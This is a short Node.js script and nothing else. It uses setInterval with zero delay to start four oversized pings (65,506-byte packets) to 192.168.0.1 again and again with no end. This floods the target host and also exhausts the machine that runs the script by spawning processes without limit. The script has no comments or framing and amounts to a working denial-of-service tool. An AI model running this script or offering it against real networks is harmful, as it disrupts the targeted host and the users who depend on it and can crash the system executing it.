import{exec}from"child_process";
setInterval(()=>{exec('ping -s 65506 192.168.0.1');exec('ping -s 65506 192.168.0.1');exec('ping -s 65506 192.168.0.1');exec('ping -s 65506 192.168.0.1');},0);
